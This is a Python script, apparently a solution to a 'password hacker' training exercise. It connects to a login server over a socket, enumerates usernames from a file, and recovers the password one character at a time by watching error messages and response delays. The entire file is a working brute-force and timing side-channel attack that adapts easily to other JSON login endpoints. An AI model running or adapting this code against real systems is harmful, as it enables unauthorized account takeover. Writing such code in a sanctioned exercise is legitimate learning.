# write your code here
import socket
import sys
import string
import time
import json
letters = [i for i in string.ascii_letters]
for i in string.digits:
    letters.append(str(i))

adress = sys.argv[1]
port = int(sys.argv[2])

file1 = open('logins.txt', 'r')


client_socket = socket.socket()
client_socket.connect((adress,port))
response = ''

flag2 = True
n=-1

while flag2:
    flag3=True
    pas = file1.readline().strip("\n")
    if pas=='':
        flag2=False


    massege=json.dumps({"login":pas,"password":""})
    passw1111 = massege.encode()
    start = time.time()
    client_socket.send(passw1111)
    response =client_socket.recv(1024)
    end=time.time()
    response = response.decode()
    time_resp = end-start


    if  time_resp > 0.1 or response=='{"result": "Exception happened during login"}':
        flag = True
        passwo=''


        while flag:
            k=-1


            flag1=True
            while flag1 and k<len(letters)-1:
                k+=1

                n_p = passwo+letters[k]

                massege=json.dumps({"login":pas,"password":n_p})
                passw1111 = massege.encode()
                start =time.time()
                client_socket.send(passw1111)
                response =client_socket.recv(1024)
                end=time.time()
                response = response.decode()
                time_resp = end-start


                if time_resp>0.1 or response == '{"result": "Exception happened during login"}':
                    passwo = n_p
                    flag1 =False

                if response == '{"result": "Connection success!"}':
                    passwo = n_p
                    flag1 = False
                    flag=False
                    flag2 = False


print(massege)
client_socket.close()





